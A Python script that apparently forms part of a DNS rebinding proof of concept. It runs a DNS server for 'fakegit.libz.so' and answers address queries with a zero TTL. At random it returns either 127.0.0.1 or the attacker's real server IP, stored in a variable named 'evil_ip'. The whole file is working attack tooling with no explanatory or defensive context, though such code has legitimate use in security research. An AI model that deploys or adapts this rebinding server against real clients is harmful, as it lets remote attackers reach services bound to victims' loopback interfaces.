import ipaddress
import os
import socket
import struct
import sys


def addr_to_dns_repr(addr):
    def label_to_dns_repr(label):
        label = label.encode()
        return bytes([len(label)]) + label

    return b''.join(label_to_dns_repr(label) for label in addr.split('.'))


def pack_ttl_with_data(ttl, data):
    return b''.join([
        struct.pack('>IH', ttl, len(data)),
        data,
    ])


def to_expected_query(addr, tp):
    return addr + struct.pack('>HH', tp, IN_CLASS)


A_TYPE = 1
NS_TYPE = 2
IN_CLASS = 1

EXPECTED_ADDR = addr_to_dns_repr('fakegit.libz.so.')
FAKEGIT_ADDR = socket.gethostbyname('libz.so')

FAKE_TTL = 0
NS_TTL = 3600


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('', 53))

while True:
    packet, client_addr = sock.recvfrom(512)
    print(f'Got a packet from {client_addr}')

    header_len = 12
    header_fmt = '>' + 'H'*6
    if len(packet) < header_len:
        print(f'Dropping the packet because it it too short ({len(packet)} bytes)', file=sys.stderr)
        continue

    header = packet[:header_len]
    transaction_id, flags, query_count, *_ = struct.unpack(header_fmt, header)

    if query_count != 1:
        print(f'Dropping the packet because it has more than one query', file=sys.stderr)
        continue

    query = packet[header_len:header_len + len(EXPECTED_ADDR) + 4]
    query_type = next((
        tp
        for tp in (A_TYPE, NS_TYPE)
        if query.lower() == to_expected_query(EXPECTED_ADDR, tp)
    ), None)

    # Respond with an single answer to the first query and nothing else.
    answer_count = query_type is not None
    # Indicate that this message is a response and copy the "recursion desired" bit from the query.
    # Also indicate this is an authoritative response for `fakegit.libz.so`.
    # Zero out everything else (in particular, unset the "recursion available" bit).
    answer_flags = 0b1000_0100_0000_0000 | (flags & 0b0000_0001_0000_0000)
    response_header = struct.pack(header_fmt, transaction_id, answer_flags, query_count, answer_count, 0, 0)

    answer = b''.join([response_header, query])
    expected_query = to_expected_query(EXPECTED_ADDR, query_type) if query_type is not None else None
    if query_type == A_TYPE:
        evil_ip = '127.0.0.1' if os.urandom(1)[0] % 4 == 0 else FAKEGIT_ADDR
        packed_evil_ip = ipaddress.IPv4Address(evil_ip).packed
        answer += b''.join([
            expected_query,
            pack_ttl_with_data(FAKE_TTL, packed_evil_ip),
        ])
        print(f'Responded with {evil_ip} to an A query')
    elif query_type == NS_TYPE:
        answer += b''.join([
            expected_query,
            pack_ttl_with_data(NS_TTL, addr_to_dns_repr('ns.libz.so.')),
        ])
        print(f'Responded to a NS query')
    else:
        print(f'Sending an empty response to unsupported query: {query}')

    sock.sendto(answer, client_addr)